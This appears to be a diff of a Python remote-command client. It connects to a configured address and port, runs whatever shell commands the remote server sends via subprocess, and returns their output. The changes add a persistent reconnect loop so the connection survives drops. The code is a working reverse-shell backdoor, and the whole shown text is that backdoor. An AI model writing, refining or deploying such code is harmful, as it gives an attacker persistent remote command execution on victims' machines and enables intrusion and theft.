@@ -11,33 +11,45 @@ FORMAT = "utf-8"
 
 class client:
 
-    def __init__(self, ip, port, header):
+    def init(self, ip, port, header):
+        passed = 1
         while True:
             try:
                 self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.server.connect((ip, port))
                 self.header = header
-                break
+                while True:
+                    passed = self.main()
+                    if not passed:
+                        return
             except:
                 sleep(2)
                 continue
 
     def main(self):
+        passed = 0
         while True:
-            self.receive()
+            passed = self.receive()
+            if not passed:
+                return 0
 
     def receive(self):
+        passed = None
         try:
             size = self.server.recv(self.header)
-        except ConnectionRefusedError:
-            return
+        except ConnectionResetError:
+            return 0
 
         msg = self.server.recv(int(size.decode()))
 
         if msg.decode() == "TEST":
-            return
+            return 1
 
-        self.run_command(msg.decode())
+        passed = self.run_command(msg.decode())
+        if not passed:
+            return 0
+
+        return 1
 
 
     def run_command(self, cmd):
@@ -46,7 +58,8 @@ class client:
             output = ''.join(chr(i) for i in output)
         except subprocess.CalledProcessError:
             output = "FAILED TO EXECUTE COMMAND"
-        self.send(output)
+        passed = self.send(output)
+        return passed
 
     def send(self, msg):
         msg_len = str(len(msg)).encode()
@@ -63,6 +76,6 @@ class client:
         return 1
 
 
-
-s = client(ADDR, PORT, 64)
-s.main()
+s = client()
+while True:
+    s.init(ADDR, PORT, 64)
